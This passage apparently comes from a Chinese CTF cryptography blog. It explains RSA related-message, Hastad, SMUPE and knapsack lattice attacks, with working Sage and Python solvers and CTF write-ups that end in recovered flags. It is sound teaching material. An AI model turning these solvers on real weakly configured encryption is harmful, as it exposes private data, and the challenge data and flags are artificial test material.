&lt; 2^kbits with factor &gt;= n^0.5 return diff def related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]参考链接#https://github.com/mimoo/RSA-and-LLL-attackshttp://inaz2.hatenablog.com/entry/2016/01/20/022936https://www.davidwong.fr/papers/david_wong_rsa_lll_boneh_durfee__2015.pdfhttps://zhuanlan.zhihu.com/p/161622928https://cryptohack.org/challengeshttps://link.springer.com/content/pdf/10.1007/3-540-49649-1_3.pdfhttps://crypto.sqrt-1.me/","link":"/62ad53e2.html"},{"title":"CTF中的RSA基本套路(4)","text":"第四部分是相关消息的内容依赖库：gmpy2pycryptopwntoolssage线性相关消息#场景#这是相关消息攻击最简单的一种形式，已知$c_1 = m_1 ^ e \\mod N,c_2 = (am_1+b)^e \\mod N，m_2 = am_1+b$解法#可以看到两次加密的消息$m_1$和$m_2$存在线性关系，当$e=3$时，根据推导(见《Low-Exponent RSA with Related Messages》)，可以得到以下关系$m_{1}=\\frac{b}{a} \\frac{c_{2}+2 a^{3} c_{1}-b 3}{c_{2}-a^{3} c_{1}+2 b^{3}}$，因此可以根据已知的$c_1、c_2、a、b$轻松得到消息$m_1$（注意，这里的除法是求逆元的意思）123456789# pythonfrom gmpy2 import invertdef getmessage(a, b, c1, c2, n): b3 = pow(b, 3, n) a3 = pow(a, 3, n) part1 = b * (c2 + 2 * c1 * a3 - b3) % n part2 = a * (c2 - c1 * a3 + 2 * b3) % n part2 = invert(part2, n) return part1 * part2 % n进阶#下面是论文中的通用情况，即$c_1= (a_1m+b_1)^e \\mod n$，$c_2 = (a_2m+b_2)^e \\mod n$，不通过前面推公式的方法，只需要通过$gcd$即可求得对应的消息。由于式子$(a_1m+b_1)^e - c_1 \\mod n$和$(a_2m+b_2)^e -c_2 \\mod n$都必然存在公共的$x-m$的根，因此通过$gcd$求得$x-m$，即可得到对应的消息$m$，1234567891011121314151617# sagedef gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() n = a1 = b1 = c1 = a2 = b2 = e = 3c2 = PR.&lt;x&gt;= PolynomialRing(Zmod(n))g1 = (a1*x+b1)^e-c1g2 = (a2*x+b2)^e-c2print(-gcd(g1, g2)[0])多消息相关#场景#假设存在$k$个消息，它们有关系式$P_0(x_1,x_2,…x_k)=p(x_1,x_2,…x_k) = 0 \\mod N$并且有$P_i(x_i)=x_i^e-c_i = 0 \\mod N$，需要求解这$k$个消息解法#根据这$k+1$个等式，我们计算$Groebner$基$Groebner([P_0,P_1,…P_k])$，可以得到结果$[x_1-m_1,…x_k-m_k]$，也就求得了所有的$k$个消息以下举例论文中比较特殊的线性相关消息，即$P_0(x_1,x_2…x_k) = x_1+x_2+…x_k-w = 0 $12345678910111213141516171819# pythonfrom Crypto.Util.number import getPrime, bytes_to_longp = getPrime(512)q = getPrime(512)n = p * qe = 3m1 = bytes_to_long(b&quot;flag{This_is_flag1}&quot;)m2 = bytes_to_long(b&quot;flag{This_is_flag2}&quot;)m3 = m1+m2+10000print(n)print(pow(m1,e,n))print(pow(m2,e,n))print(pow(m3,e,n))'''108684504406001730978107355065522913091470167674222436489722232508562878942265531378563853986279259519842855383477949581415300994618557266600557629814170912555530200441331549267805294484355321505430150563949802485514426432450612355535035910835277447960752175362457165729276266536456917482476441605301749223673119166778589125956267413038030487630732650620842328196991520390707794486038399436452214505686505591977538042950908921943069636790519051251191667785891259562674130380304876307326506609103609003998596754926376666626077239053372039750680548450198110583544231272374300456426378195333422871300765013930430424390104586121138764086629711853351243347558333657355599432416841199469970564180649403376333107226365096683496'''解的脚本如下：1234567891011121314151617181920212223# sagee = 3cnt = 3N=108684504406001730978107355065522913091470167674222436489722232508562878942265531378563853986279259519842855383477949581415300994618557266600557629814170912555530200441331549267805294484355321505430150563949802485514426432450612355535035910835277447960752175362457165729276266536456917482476441605301749223673c1=11916677858912595626741303803048763073265062084232819699152039070779448603839943645221450568650559197753804295090892194306963679051905125c2=11916677858912595626741303803048763073265066091036090039985967549263766666260772390533720397506805484501981105835442312723743004564263781c3=95333422871300765013930430424390104586121138764086629711853351243347558333657355599432416841199469970564180649403376333107226365096683496c = [c1,c2,c3]PR = PolynomialRing(Zmod(N), 'x', cnt)x = PR.gens()F = []for i in range(cnt): F.append(pow(x[i],e)-c[i])F.append(x[0]+x[1]-x[2]+10000)I = Ideal(F)G= I.groebner_basis()for b in G[:-1]: mi = ZZ(-b(0, 0, 0)) print(bytes.fromhex(hex(mi)[2:]))'''b'flag{This_is_flag1}'b'flag{This_is_flag2}''''Hastad 攻击#场景#前面的两个相关消息攻击模数都是相同的，而在Hasted广播攻击中则不同使用不同但互质的模数$n$，相同的指数$e$、加密$e$个明文得到$e$个密文，即$c_i = (a_ix+b_i)^e \\mod n_i ,i=1,2…e$解法#通过这$e$个式子，我们有$e$个等式：$(a_ix+b_i)^e -c_i \\equiv 0 \\mod n_i，i=1,2…e$由于这$e$个式子中，模数都是互质的，那么通过中国剩余定理，我们可以得到$P(x) \\equiv 0 \\mod M，M=\\prod_{i=1}^{e} n_i$，而$P(x)$又必然存在唯一解，并满足LLL算法约束，因此可以通过sage的small_roots函数解得，以下给出两个写法分别来自https://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/hastads.sage和https://xz.aliyun.com/t/6813123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# sagedef linearPaddingHastads1(cArray, nArray, aArray, bArray, e=3, eps=1/8): &quot;&quot;&quot; Performs Hastads attack on raw RSA with no padding. This is for RSA encryptions of the form: cArray[i] = pow(aArray[i]*msg + bArray[i],e,nArray[i]) Where they are all encryptions of the same message. cArray = Ciphertext Array nArray = Modulus Array aArray = Array of 'slopes' for the linear padding bArray = Array of 'y-intercepts' for the linear padding e = public exponent &quot;&quot;&quot; if(len(cArray) == len(nArray) == len(aArray) == len(bArray) == e): for i in range(e): cArray[i] = Integer(cArray[i]) nArray[i] = Integer(nArray[i]) aArray[i] = Integer(aArray[i]) bArray[i] = Integer(bArray[i]) TArray = [-1]*e for i in range(e): arrayToCRT = [0]*e arrayToCRT[i] = 1 TArray[i] = crt(arrayToCRT, nArray) P.&lt;x&gt; = PolynomialRing(Zmod(prod(nArray))) gArray = [-1]*e for i in range(e): gArray[i] = TArray[i]*(pow(aArray[i]*x + bArray[i], e) - cArray[i]) g = sum(gArray) g = g.monic() # Use Sage's inbuilt coppersmith method roots = g.small_roots(epsilon=eps) if(len(roots) == 0): print(&quot;No Solutions found&quot;) return -1 return roots[0] else: print(&quot;CiphertextArray, ModulusArray, and the linear padding arrays need to be of the same length,&quot; + &quot;and the same size as the public exponent&quot;)def linearPaddingHastads2(cArray, nArray, aArray, bArray, e=3, eps=1/8): cnt = e PR = PolynomialRing(ZZ, 'x') x = PR.gen() Fs = [] for i in range(cnt): f = PR((A[i]*x + B[i])**e - Cs[i]) ff = f.change_ring(Zmod(Ns[i])) ff = ff.monic() f = ff.change_ring(ZZ) Fs.append(f) F = crt(Fs, Ns) M = reduce(lambda x, y: x * y, Ns) FF = F.change_ring(Zmod(M)) m = FF.small_roots(epsilon=1/16) if m: return m[0] else: return NoneSMUPE 问题#场景#在经历了模数相同的相关消息攻击，也看过了模数不同的Hastad攻击，但是我们的指数$e$始终是一致的，SMUPE问题是论文《Solving Systems of Modular Equations in One Variable: How Many RSA-Encrypted Messages Does Eve Need to Know? 》中提出的，不仅模数不同，且指数$e$也不同，具体如下：假如我们有$k$个式子，$c_i = (a_ix+b_i)^{e_i} \\mod n_i,i=1,2…k $，此时如何求解未知的消息呢解法#示例1：以论文中为例，已有4个公钥$(e,N)$分别为$(3,N_1),(3,N_2),(5,N_3),(5,N_4)$，且有$c_i = (a_ix+b_i)^{e_i} \\mod N_i,i=1,2…4$由于阶次不同，无法直接进行CRT，因此需要构造得到同阶次的式子进行CRT。123456789101112131415161718192021Cs = [...]PKs = [(3,..), (3,..), (5,..), (5,..)]cnt = 4A = []B = []PR = PolynomialRing(ZZ, 'x')x = PR.gen()Fs = []for i in range(cnt): f = PR( ( A[i]*x + B[i] )**PKs[i][0] - Cs[i] ) ff = f.change_ring( Zmod(PKs[i][1]) ) ff = ff.monic() f = ff.change_ring(ZZ) Fs.append(f)F = crt( [ Fs[0]**2, Fs[1]**2, x*Fs[2], x*Fs[3] ], [ PKs[i][1] for i in range(cnt) ] )M = reduce( lambda x, y: x * y, [ PKs[i][1] for i in range(cnt) ] )FF = F.change_ring( Zmod(M) )m = FF.small_roots(X=2**760, beta=7./8)[0]print(m)示例2：也是为了更加深入理解这个构造，在此示例中，$e$分别为2和3123456789101112131415161718192021222324252627c1 = c2 = a1 = a2 = b1 = b2 = Cs = [c1, c2]A = [a1, a2]B = [b1, b2]cnt = 2PKs = [(2,n1), (3,n2)]PR = PolynomialRing(ZZ, 'x')x = PR.gen()Fs = []for i in range(cnt): f = PR( ( A[i]*x + B[i] )**PKs[i][0] - Cs[i] ) ff = f.change_ring( Zmod(PKs[i][1]) ) ff = ff.monic() f = ff.change_ring(ZZ) Fs.append(f)F = crt( [ Fs[0]*x, Fs[1]], [ PKs[i][1] for i in range(cnt) ] )M = reduce( lambda x, y: x * y, [ PKs[i][1] for i in range(cnt) ] )FF = F.change_ring( Zmod(M) )m = FF.small_roots(epsilon=1.0/16)[0]print(m)PS：small_roots的参数需要根据实际情况进行调整12345678910111213141516171819Let `N` be the characteristic of the base ring this polynomial is defined over: ``N = self.base_ring().characteristic()``. This method returns small roots of this polynomial modulo some factor `b` of `N` with the constraint that `b &gt;= N^\\beta`. Small in this context means that if `x` is a root of `f` modulo `b` then `|x| &lt; X`. This `X` is either provided by the user or the maximum `X` is chosen such that this algorithm terminates in polynomial time. If `X` is chosen automatically it is `X = ceil(1/2 N^{\\beta^2/\\delta - \\epsilon})`. The algorithm may also return some roots which are larger than `X`. 'This algorithm' in this context means Coppersmith's algorithm for finding small roots using the LLL algorithm. The implementation of this algorithm follows Alexander May's PhD thesis referenced below. INPUT: - ``X`` -- an absolute bound for the root (default: see above) - ``beta`` -- compute a root mod `b` where `b` is a factor of `N` and `b \\ge N^\\beta`. (Default: 1.0, so `b = N`.) - ``epsilon`` -- the parameter `\\epsilon` described above. (Default: `\\beta/8`) - ``**kwds`` -- passed through to method :meth:`Matrix_integer_dense.LLL()参考链接#https://xz.aliyun.com/t/6813#toc-2https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/#related-message-attackLow-Exponent RSA with Related Messageshttps://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/hastads.sage","link":"/2decc525.html"},{"title":"Knapsack Problem","text":"最近经常碰到背包问题，所以稍微整理一下问题描述#一般我们碰到的都是0 1背包问题，如下，我们已有数字$a_1,a_2…a_n$，从中给它们分别赋予0或者1的权重$w_i$，使得最终的和为$W$，即$$\\sum_1^n w_ia_i = W$$而在这类问题中，当$n$较大时就是一个$2^n$复杂度的NP问题解法#主要通过构造LLL格解决，目前的解法对Knapsack Problem的密度要求为$\\frac{n}{log_2(max(pb))}&lt; 0.9408$，具体的格的方法有很多种，脚本内是其中的一种构造12345678910111213141516171819202122232425262728293031323334353637383940from sage.all import *pk = # public keyct = # ciphertextprint(ct)print(len(pk))n = len(pk)# Sanity check for application of low density attackd = n / log(max(pk), 2)print(CDF(d))assert CDF(d) &lt; 0.9408M = Matrix.identity(n) * 2last_row = [1 for x in pk]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)last_col = pklast_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.BKZ()sol = []for i in range(n + 1): testrow = X.row(i).list()[:-1] if set(testrow).issubset([-1, 1]): for v in testrow: if v == 1: sol.append(0) elif v == -1: sol.append(1) breaks = solprint(s)2020 天翼杯 alicehomework#123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/pythonfrom Crypto.Util.number import *import randomimport gmpy2from secret import flagdef generateKey(bitlen): u = 2 v = 200 seed = random.randint(3**bitlen,4**bitlen) sequence = [seed] s = seed for i in range(1,bitlen): seed = random.randint(s + v, u*(s+v)) sequence.append(seed) s += seed q = random.randint(s+v, u*(s+v)) r = random.randint(1, q) while gmpy2.gcd(r, q) != 1: r = random.randint(1, q) key = [ r*w % q for w in sequence] return keydef encrypt(msg, pubKey): msg_bit = msg n = len(pubKey) cipher = 0 i = 0 for bit in msg_bit: cipher += int(bit)*pubKey[i] i += 1 return bin(cipher)[2:]msg = bin(bytes_to_long(flag))[2:]key = generateKey(len(msg))enc = encrypt(msg, key)print keyprint int(enc, 2)从加密的函数看就是01背包问题了，并且给出了公钥和最后的密文，直接带入脚本求出二进制bit，然后通过简单运算可以得到结果123456789101112131415161718192021222324252627282930313233343536373839404142from sage.all import *from Crypto.Util.number import long_to_bytespk = ct = n = len(pk)# Sanity check for application of low density attackd = n / log(max(pk), 2)print(CDF(d))assert CDF(d) &lt; 0.9408M = Matrix.identity(n) * 2last_row = [1 for x in pk]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)last_col = pklast_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.BKZ()sol = []for i in range(n + 1): testrow = X.row(i).list()[:-1] print(testrow) if set(testrow).issubset([-1, 1]): for v in testrow: if v == 1: sol.append(0) elif v == -1: sol.append(1) breaks = solprint(s)result = [pow(2,len(s)-1-i)*s[i] for i in range(len(s))]print(long_to_bytes(sum(result)))# flag{8130e8c14fe4df06558c0a7ebf06f272}2020 WMCTF babysum#12345678910111213# task.pyfrom json import dumpfrom random import SystemRandomrandom = SystemRandom()k, n, d = 20, 120, 0.8B = 2**(n/d)A = [random.randint(1, B) for _ in range(n)]s = sum(A[index] for index in random.sample(range(n), k))dump((s, A), open(&quot;data&quot;, &quot;w&quot;))看了看密度是$0.8&lt;0.9408$，以为用前面的脚本也是可以一把梭，结果改了好多格的构造都不行，最后发现是自己一直都没注意一些东西：比如格求解的条件啊啥的。https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto 里写的比较好，但大部分人都是看了出题人的博客2333 https://blog.soreatu.com/posts/crypto-research-subset-sum-problem/。不过即使看到了博客上的源码，跑这个也是费时费钱。。。听说babysum的大哥sum得100核的机器上跑一个小时才出结果。穷苦人家的孩子只能用四核跑一下babysum，大概15分钟的亚子。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778# sageimport randomimport multiprocessing as mpfrom json import loadfrom functools import partialdef check(sol, A, s): &quot;&quot;&quot;Check whether *sol* is a solution to the subset-sum problem. &quot;&quot;&quot; return sum(x*a for x, a in zip(sol, A)) == sdef solve(A, n, k, s, ID=None, BS=22): N = ceil(sqrt(n)) # parameter used in the construction of lattice rand = random.Random(x=ID) # seed lat = [] for i,a in enumerate(A): lat.append([1*(j == i) for j in range(n)] + [N*a] + [N]) lat.append([0]*n + [N*s] + [k*N]) itr = 0 start_time = cputime() while True: # 1. initalization t0 = cputime() itr += 1 # print(f&quot;[{ID}] n={n} Start... {itr}&quot;) # 2. Zero Force # (k+1) * (k+2) # 1 0 ... 0 a0*N N # 0 1 ... 0 a1*N N # . . ... . ... . # 0 0 ... 1 a_k*N N # 0 0 ... 0 s*N k*N # 3. Randomly shuffle l = lat[::] shuffle(l, random=rand.random) # 4. BKZ!!! m = matrix(ZZ, l) t_BKZ = cputime() m_BKZ = m.BKZ(block_size=BS) print(f&quot;[{ID}] n={n} {itr} runs. BKZ running time: {cputime(t_BKZ):.3f}s&quot;) # 5. Check the result # print(f&quot;[{ID}] n={n} first vector norm: {m_BKZ[0].norm().n(digits=4)}&quot;) for i, row in enumerate(m_BKZ): if check(row,A,s) and row.norm()^2 == k: print(row) return Truedef main(): CPU_CORE_NUM = 4 k,n= 20,120 s,A = load(open('data','r')) solve_n = partial(solve,A,n,k,s) with mp.Pool(CPU_CORE_NUM) as pool: reslist = pool.imap_unordered(solve_n,range(CPU_CORE_NUM)) for res in reslist: if(res): pool.terminate() breakif __name__ == &quot;__main__&quot;: main()'''(0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0)/Applications/SageMath-9.0.app/sage babysum.sage 3929.59s user 111.40s system 399% cpu 16:52.48 total'''然后丢进check.py，可以得到WMCTF{83077532752999414286785898029842440}参考#《Cryptanalysis of two knapsack public-key cryptosystems》http://www.dtc.umn.edu/~odlyzko/doc/arch/knapsack.survey.pdfhttps://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto/https://blog.soreatu.com/posts/crypto-research-subset-sum-problem/","link":"/c65d2bd5.html"},{"title":"记录CTF中的RSA非常规题解","text":"如果你熟悉去年所有CTF比赛中的web题解，那么比赛中一半以上的题都能轻松解决 —— posix小姐姐2020 网鼎杯 you raise me up#12345678910111213#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomn = 2 ** 512m = random.randint(2, n-1) | 1c = pow(m, bytes_to_long(flag), n)print 'm = ' + str(m)print 'c = ' + str(c)# m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075# c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499是未知$e$的情况，我们知道当$e&lt; 2^{64}$时可以通过$bsgs$解决，但这里$e$明显太大了，不过sage提供了discrete_log()进行求解12e=discrete_log(Mod(c,n),Mod(m,n))# sageTHUCTF 2020#123n = 114343085046463433411381776220543901901873928314903659614100254404100269463417499891993902366447489777312635887492019329010394661845440919768114220413686723810221962634122271643213501630972122082386450374407459824201848960741304431687915771670375151120891105793486536323734874929422017875459395117658992059677c = 13846088761249274894419103279045282375487763683995312060440838007907740908823459642104765943567278004708454106950053867493815381644814326087833645838085583648474274053678710283961944977624408887071161969899530550350651217014405314971000490160772779592534152739993145750368224763360145867832154164972779219432*d+e*phi+2020 = 22046774932370586482011989351077962586470998216913397840682653185876350155036481792005139545363427307155556226952079206673782623819821327455802429601369994136121668582623039411726516755690052737901843564168187074397101479942270643179299412053210417686126964426668454289595567836618481967225032457758237543611808222https://writeups.amosng.com/2018/easyctf_2018/cryptography/hidden-key_250/一般我们找$d$都是在$d &lt; \\phi(n)$找，但其实$d$只要满足$ed \\mod \\phi(n) = 1$即可，所以在这里$d = s//2$1234567891011from Crypto.Util.number import *from tqdm import tqdmn = 114343085046463433411381776220543901901873928314903659614100254404100269463417499891993902366447489777312635887492019329010394661845440919768114220413686723810221962634122271643213501630972122082386450374407459824201848960741304431687915771670375151120891105793486536323734874929422017875459395117658992059677c = 1384608876124927489441910327904528237548776368399531206044083800790774090882345964210476594356727800470845410695005386749381538164481432608783364583808558364847427405367871028396194497762440888707116196989953055035065121701440531497100049016077277959253415273999314575036822476336014586783215416497277921943s = 22046774932370586482011989351077962586470998216913397840682653185876350155036481792005139545363427307155556226952079206673782623819821327455802429601369994136121668582623039411726516755690052737901843564168187074397101479942270643179299412053210417686126964426668454289595567836618481967225032457758237543611808222s = s - 2020d = s//2m = pow(c, d, n)print(long_to_bytes(m))# THUCTF{99049c76-3447-46d0-b52e-299e25755a48}2020 巅峰极客 tryRSA#1234567891011121314151617181920212223242526272829from secret import e1,e2,flagfrom Crypto.Util.number import *msg = bytes_to_long(\"=========Hint:e1=\"+str(e1)+\"=============\")p = getPrime(512)q = getPrime(512)N = p*qprint Nprint pow(msg,3,N)msg = bytes_to_long(flag)p = getPrime(1024)q = getPrime(1024)N = p*qc = pow(msg, e2, N)print N,e2print cprint(pow(p+q,e1,N ))print(pow(p+e1, q, N))'''924927703731195844600819877624236429212578447271878367620049092811924592719716347261611439814580716953409945911079724253525316692710787409789011357623043597984699763807067117163979093272028890360663320305348069561495332636773654723750537699190449699238109930415514556188091230441958074788352229215518452236732824913235004457968709111096428544657540480540075732695418522209880360500895449076046224666367436004795119729655768934785671629753162133143028934466949893923958862431122146475765261940207323499351545014359480502243869455976534424783804818613768378386984835599495312527015781782143176377305444708803319343811009307670517970464768333771120997045181708841835585570829548449323842457013912871572311489720085833836018287540353234899258733164425361573491416926759037218022548655403489670177828691645649124879974295681372533797388585691439378293643867458900873524289213226600650695273378214798580343627514294295063280759129845430749116891862775979009255567653541999885963152760100703226634896555671676063304361506854160585739743294659176171738147833879545955904927967598053108666430271719503999512230196683852929862867406713611436850146222646354297511499309143157446775247989917315728885081 65537696047139088767683677057671772366552799981287655628111848516408199891157787538190844660293034433365494409134904266283471084168660209678648865232135986258761605625559274569736373035042400643030439811841282253877846078395933495628787362633940391592393263343814229609919386844669477658301698195288767184631045341379956639094472722238771430042525616544478292201114009504415989029207362297244739068558254170709479177426661101070751016570646990566551194003215519548227674634789661098003789050086667127962350102106011746646385745341581694523963534105757043705956006626020294089839447665411140334582767511320043140589857722810433581621408609622737288639186902549076835492413174890272488043992858155757705384138549596430975871399679039837282984681932292577951045899669048609281029616179766182402995129287631476625093178189326410832033372462191000490093391176035716338773029788172196890481244754193700262802796058656263534065627165202003301564197187270103773059533694965771860082356408340524761744798186681642693561339419791672531653180468644307499414697177768983950778057611109782846009850349967748508790179756555906822836217302889604712738953274692579804430605949761096024352138974196461918536461309326430096676561006977392285719889071083262367294939363830936563488061919820815242930281093184747199533909423831655805653462926444204702027721204809679004109764873839689145594088483842010258154637719914884625388278232087919706082381019835448905310742695003695950771324141473767622775925225996118945331612570816055138158026344226500272784973866690432399708551301786027237710788172551956598563031161785118254195771411706070504960683710473948125061842911067623875812101363911946970263021272358739604106737786749756437515890114561301491995915709307108967981619075610635000644793538253463486203886648971971414160634218354735619624263269704236191332074536463815524'''$e1$通过开根即可求出，对$(p+q)^{e_1} \\mod N$和$(p+e_1) ^ q \\mod N$化简如下：$$c_1 = (p+q)^{e_1} \\mod N = (p+q)^{e_1} \\mod pq = (p+q)^{e_1}+kpq$$$$c_1 \\mod q = p^{e_1} \\mod q = p^{e_1}+k_1q$$$$c_2 = (p+e_1)^q \\mod N = (p+e_1)^q + kpq$$$$c_2 \\mod q = (p+e_1) \\mod q (费马小定理) = (p+e_1) + k_2q$$因此我们有$gcd((c_2-e_1)^{e_1}-c_1,N) = q$1234567891011121314151617181920212223242526from Crypto.Util.number import long_to_bytes, inversefrom gmpy2 import iroot, gcdN = 92492770373119584460081987762423642921257844727187836762004909281192459271971634726161143981458071695340994591107972425352531669271078740978901135762304359798469976380706711716397909327202889036066332030534806956149533263677365472375053769919044969923810993041551455618809123044195807478835222921551845223673c = 28249132350044579687091110964285446575404805400757326954185222098803605008954490760462246663674360047951197296557689347856716297531621331430289344669498939239588624311221464757652619402073234993515450143594805022438694559765344247838048186137683783869848355994953125msg = iroot(c, 3)[0]msg = long_to_bytes(msg)e1 = msg.split(b\"e1=\")[1].replace(b'=', b'')e1 = int(e1)N = 27015781782143176377305444708803319343811009307670517970464768333771120997045181708841835585570829548449323842457013912871572311489720085833836018287540353234899258733164425361573491416926759037218022548655403489670177828691645649124879974295681372533797388585691439378293643867458900873524289213226600650695273378214798580343627514294295063280759129845430749116891862775979009255567653541999885963152760100703226634896555671676063304361506854160585739743294659176171738147833879545955904927967598053108666430271719503999512230196683852929862867406713611436850146222646354297511499309143157446775247989917315728885081e2 = 65537c = 6960471390887676836770576717723665527999812876556281118485164081998911577875381908446602930344333654944091349042662834710841686602096786488652321359862587616056255592745697363730350424006430304398118412822538778460783959334956287873626339403915923932633438142296099193868446694776583016981952887671846310453413799566390944727222387714300425256165444782922011140095044159890292073622972447390685582541707094791774266611010707510165706469905665511940032155195482276746347896610980037890500866671279623501021060117466463857453415816945239635341057570437059560066260202940898394476654111403345827675113200431405898577228c1 = 1043358162140860962273728863918690254907683549241317489027248804399285815575770538413854959643097587139967903983728298468193229257795104589966904860928102961617976618240299512928763147662509317818932641083203337246219100049009339117603571633877302978817219689048124475419370026280279605865626353406562716520200330156419718727010377305953369496577186008235640834052476174479818668164269356133941979167253165318046864430749941469717776898395077805761110978284600985034996774850879017975655590682283621730288960471273895327469257980443060594976109602435213897419646191853646130932643009667656100697739228571988907108326c2 = 2367294939363830936563488061919820815242930281093184747199533909423831655805653462926444204702027721204809679004109764873839689145594088483842010258154637719914884625388278232087919706082381019835448905310742695003695950771324141473767622775925225996118945331612570816055138158026344226500272784973866690432399708551301786027237710788172551956598563031161785118254195771411706070504960683710473948125061842911067623875812101363911946970263021272358739604106737786749756437515890114561301491995915709307108967981619075610635000644793538253463486203886648971971414160634218354735619624263269704236191332074536463815524ans = pow(c2-e1, e1, N) - c1q = gcd(ans, N)p = N//qphi = (p-1)*(q-1)d = inverse(e2, phi)m = pow(c, d, N)print(long_to_bytes(m))# flag{5b55c69f-398d-47bc-ad37-4f268e8ae4b2}2020 西湖论剑 Wake me up until May ends#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107from Crypto.Util.number import *from gmpy2 import *from secret import flag, source_pfrom random import randint, shufflefrom sympy.ntheory import factorintdef all_factor(n): factors = [] limit = n//2 + 1 for i in range(1, limit): if n % i == 0: factors.append(i) factors.append(n) return factorsdef u(d): if d == 1: return 1 factors = factorint(d) primes = list(factors.keys()) index = list(factors.values()) for i in index: if i &gt;= 2: return 0 return pow(-1, len(primes) % 2)def f(d): factors = factorint(d) primes = list(factors.keys()) index = list(factors.values()) base = 1 for i in range(len(primes)): base *= pow(primes[i], index[i]-1) base *= (primes[i] - 1) return basedef combine(n): factors = all_factor(n) base = 0 for i in factors: base += u(i) * f(i) return basedef Yusa(m): p = getPrime(533) q = getPrime(533) n = p * q _phi = (p - 1) * (q - 1) limit1 = (3 * n) // (2 * (int(iroot(n, 4)[0]) + 3 * (p + q))) while True: x = getPrime(256) y = getPrime(256) if x * y &lt; limit1: break limit2 = (abs(p-q) * int(iroot(n, 4)[0]) * y) // (6 * (max(p, q))) e = (y * _phi) // x while True: z = e * x - y * _phi if abs(z) &lt; limit2 and gcd(e, _phi) == 1: break e -= 1 c = pow(m, e, n) return c, e, nshuffle(source_p)p = source_p[:7]length = 7index = []n = 1for i in range(length): index.append(randint(1, 23)) n *= p[i] ** index[i]n = -combine(n)assert n.bit_length() &gt; 2048e = getPrime(256)_c, _e, _n = Yusa(e)m = bytes_to_long(flag.encode())c = pow(m, e, n)print('c =', c)print('p =', source_p)print('index =', index)print('_e =', _e)print('_n =', _n)print('_c =', _c)# data'''primes = [6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503118559, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503126443, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503193349, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503562289, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503734189, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503760301, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503782813, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503951191, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504074953, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504107911, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504191461, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504448729, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504539989]c = 84010209207136400037674900630630399007540527378939350615722225527845587559010102178617103738600464258190430641037546648203366413208680794400023737381999928100638870193135477985407368386033167118399673001236960699550393986712868487827560601610546135335952667201927052409197291462799539018091792246183307678928298241645258411316936304167124933556606198943248215284393941957893610109127025761289673484220381931928088574316265497075872825588843686573267223321714224535003053507039588501110165036609252972283465620670619170664971316238808580562960566239652372002792893860381585262550998380705474210656337505369024906108022045918104803080765059727578165530772500933465284347893453376016683018177839155666453880461050298815103588796089076127048997409337740340488597725920421812209214132626919132717242722587461710190518049279845280531076833361229586237230905386909567570882397978261647980071794688572393137428928552335623610968045342130104152766075095859252589558838654095036476181115093298573203118822557283958028992348972004110923680696213759378910314691270631431638964147123334674index = [17, 4, 10, 5, 22, 23, 3]_e = 372077403420031165815439199213704344304928202869941592969972103002464355333911024937074871410825817568355544126574173758702600945390438495248751733573391345292294888885607465578329781858741122278411513362633310583564023669185613282939355138576537165757775740881908805743008022348524049466231348651228609449357106436669219_n = 